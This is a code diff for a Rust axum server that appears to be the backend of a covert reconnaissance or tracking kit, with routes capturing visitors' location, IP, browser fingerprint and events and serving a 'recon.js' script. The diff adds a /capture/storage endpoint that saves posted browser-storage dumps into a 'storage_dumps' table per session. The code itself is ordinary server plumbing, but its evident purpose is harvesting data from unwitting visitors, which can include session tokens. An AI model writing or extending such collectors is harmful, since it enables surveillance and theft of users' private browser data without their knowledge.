@@ -1,3 +1,5 @@
+use serde_json::Value;
+use axum::http::StatusCode;
 use axum::extract::State;
 use axum::routing::{get, post};
 use axum::{Json, Router};
@@ -158,7 +160,8 @@ async fn main() -> anyhow::Result<()> {
         .route("/capture/location", post(capture::receive_location))
         .route("/capture/ip", post(capture::receive_ip))
         .route("/capture/fingerprint", post(capture::receive_fingerprint))
-        .route("/capture/event", post(capture::receive_event));
+        .route("/capture/event", post(capture::receive_event))
+        .route("/capture/storage", post(receive_storage));
 
     let serve_dir = ServeDir::new(&frontend_dir)
         .append_index_html_on_directories(true);
@@ -236,4 +239,22 @@ async fn serve_recon_js(State(state): State<Arc<AppState>>) -> Response {
             .body("recon.js not found".into())
             .unwrap()
     }
+}
+
+
+async fn receive_storage(
+    State(state): State<Arc<AppState>>,
+    Json(body): Json<Value>,
+) -> Result<StatusCode, StatusCode> {
+    let session_id = body.get("session_id").and_then(|v| v.as_str()).unwrap_or("default").to_string();
+    let now = chrono::Utc::now().timestamp();
+    let id = uuid::Uuid::new_v4().to_string();
+    let data_str = serde_json::to_string(&body).unwrap_or_default();
+
+    sqlx::query("INSERT INTO storage_dumps (id, session_id, data, created_at) VALUES (?, ?, ?, ?)")
+        .bind(&id).bind(&session_id).bind(&data_str).bind(now)
+        .execute(&state.pool).await.map_err(|e| { tracing::error!("Storage insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;
+
+    tracing::info!("Storage dump received for session {}", session_id);
+    Ok(StatusCode::OK)
 }
